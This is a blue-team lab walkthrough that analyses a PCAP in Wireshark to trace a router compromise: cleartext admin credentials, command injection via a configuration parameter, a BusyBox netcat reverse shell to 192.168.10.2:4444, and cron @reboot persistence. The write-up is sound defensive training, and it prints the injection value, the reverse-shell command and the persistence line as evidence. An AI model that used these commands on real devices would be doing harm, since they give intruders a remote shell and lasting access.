# BTLO Walkthrough – Trend Router Compromise

> **Lab:** Trend  
> **Platform:** Blue Team Labs Online (BTLO)  
> **Focus:** Network Traffic Analysis, Command Injection, Post-Exploitation, Persistence

---

## 1. Lab Overview

This lab simulates the compromise of a network router through its web management interface. The objective is to analyse a provided PCAP file to identify:

* The source of the attack
* The vulnerable endpoint
* Credential exposure
* Command injection and post-exploitation activity
* Persistence mechanisms

All analysis was performed using **Wireshark**.

---

## 2. Initial Traffic Analysis

The provided capture (`Trend.pcap`) was loaded into Wireshark. Initial inspection focused on HTTP traffic, as routers often expose web-based management interfaces.

A display filter was applied to isolate HTTP POST requests:

```
http.request.method == "POST"
```

This immediately revealed repeated POST requests to several router endpoints, most notably:

* `/login.ccp`
* `/get_set.ccp`

📸 **Screenshot:** `<img width="930" height="136" alt="vulnerable-endpoint-get-set-ccp" src="https://github.com/user-attachments/assets/e5596e2f-5ec2-4eb3-a503-bd540f3cfb95" />


---

## 3. Attacker Source Identification

By inspecting the source and destination fields of the HTTP POST traffic, the attacker IP address was identified as:

* **Attacker IP:** `192.168.10.2`
* **Target (Router):** `192.168.10.1`



📸 **Screenshot:** <img width="1031" height="432" alt="attacker-source-ip-" src="https://github.com/user-attachments/assets/19085863-e75b-4dcc-b9af-fdd198f7d070" />

This confirms that the attacker is operating from within the same internal network.

---

## 4. Credential Exposure (Cleartext Login)

Following the `/login.ccp` POST requests and using **Follow → TCP Stream**, login attempts were reconstructed.

The HTTP payload revealed credentials transmitted in **cleartext**:

* **Username:** `admin`
* **Password:** `admin`

This indicates a lack of HTTPS/TLS protection on the management interface.

📸 **Screenshot:** <img width="1024" height="833" alt="login-cleartext-credentials" src="https://github.com/user-attachments/assets/7449e646-5147-497b-93bc-673cc96b6f9b" />


---

## 5. Successful Authentication

After multiple login attempts, a successful authentication was observed. The server response returned a redirect indicating a valid login session.

📸 **Screenshot:** <img width="1561" height="866" alt="login-success-redirect" src="https://github.com/user-attachments/assets/a162ce09-25e4-4770-a40e-f29cf8745578" />


This confirms the attacker gained authenticated access to the router’s web interface.

---

## 6. Command Injection via get_set.ccp

Further inspection of POST requests to `/get_set.ccp` revealed user-controlled parameters being abused to inject system commands.

An example malicious parameter value included:

```
lanHostCfg_HostName_1.1.1.0="; mkdir test"
```

This demonstrates classic **command injection**, where shell commands are appended to a configuration parameter.

📸 **Screenshot:** ---<img width="1538" height="836" alt="command-injectionparameter" src="https://github.com/user-attachments/assets/9495d035-df83-423b-8aa3-e5c9677cd6ac" />




## 7. Initial Command Execution

Following the injection, command execution was confirmed by observing filesystem interaction through subsequent responses.

The attacker successfully executed:

```
mkdir test
```

📸 **Screenshot:**  <img width="1516" height="838" alt="initial-command-mkdir-test" src="https://github.com/user-attachments/assets/30f21a2e-2bf2-4b00-827b-f660c053f1b1" />


This validated remote code execution on the router.

---

## 8. Post-Exploitation Activity

The attacker proceeded with post-exploitation reconnaissance by executing:

```
whoami
```

The output confirmed execution context on the router system.

📸 **Screenshot:** <img width="1549" height="842" alt="post-exploitation-whoami" src="https://github.com/user-attachments/assets/6074172d-a1db-40de-b2b7-b1e2994e13dd" />


---

## 9. Reverse Shell Establishment

Further payloads revealed the use of **BusyBox netcat** to establish a reverse shell:

```
busybox nc 192.168.10.2 4444 -e /bin/sh
```

Network-level confirmation was achieved by filtering for TCP SYN packets on port 4444:

```
tcp.port == 4444 && tcp.flags.syn == 1
```

📸 **Screenshots:**

* <img width="1512" height="813" alt="reverse-shell-command" src="https://github.com/user-attachments/assets/3b43369e-f784-411c-bc61-b1f272640acc" />

* <img width="1531" height="225" alt="tcp-4444-reverse-shell-established" src="https://github.com/user-attachments/assets/0783f043-ff72-4463-be51-dea142226aff" />


This confirms interactive remote access was obtained.

---

## 10. Persistence Mechanism

To maintain access, the attacker modified the router’s cron configuration:

```
@reboot /tmp/shell.sh
```

This ensures the malicious shell script executes automatically on every reboot.

📸 **Screenshot:** `<img width="1044" height="828" alt="cron-persistence-reboot" src="https://github.com/user-attachments/assets/522245cd-c51a-4f38-9a78-aa44fbce7dd9" />


---

## 11. Device Fingerprinting

Additional traffic revealed device metadata, including:

* Firmware version
* Device model details

This information could be used for tailored exploitation or lateral movement.

📸 **Screenshots:**

* <img width="1034" height="684" alt="device-model-details" src="https://github.com/user-attachments/assets/1fa79866-1008-46d6-bf53-4f6ecbdbb9e8" />

* <img width="1538" height="831" alt="device-firmware-version" src="https://github.com/user-attachments/assets/6e7fec7f-dab8-4ca6-b33d-7ed8de14a503" />


---

## 12. Conclusion

This lab demonstrates a full compromise chain:

1. Cleartext credential exposure
2. Successful authentication
3. Command injection vulnerability
4. Remote code execution
5. Reverse shell establishment
6. Persistence via cron

### Key Takeaways:

* Exposed management interfaces without TLS are high-risk
* Input validation failures lead directly to RCE
* Network traffic analysis alone can fully reconstruct an attack timeline

---

## Tools Used

* Wireshark
* Blue Team Labs Online (BTLO)

---

**Author:** Teodor Todorov  
**Goal:** SOC Analyst / Blue Team

